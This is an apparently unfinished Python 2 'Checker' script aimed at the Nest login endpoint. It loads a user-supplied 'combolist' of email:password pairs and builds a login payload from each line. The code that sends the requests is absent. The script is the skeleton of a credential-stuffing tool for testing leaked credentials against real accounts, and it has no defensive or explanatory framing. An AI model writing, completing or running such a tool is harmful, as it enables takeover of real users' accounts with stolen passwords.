import requests
import webbrowser
import os, sys
import time
import inspect
import json
import re 
###### LOGIN URL ######
url = "https://home.nest.com/session"
######   COLORS  ######
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def welcome():
    os.system("clear")
    print ("welcome to the " + os.path.basename(__file__)[:-3] + " Checker!")


def importCombolist():
    print "Please drag and drop a combolist here."
    combolistPath = raw_input('==> ')
    with open(combolistPath.replace(" ", ""), 'r') as myfile:
         for line in myfile:
             payload = 0
             line = line.replace('\n', '')
             email = line.split(":")[0]
             password = line.split(":")[1]
             payload = {'email': email, 'password': password}




welcome()
importCombolist()
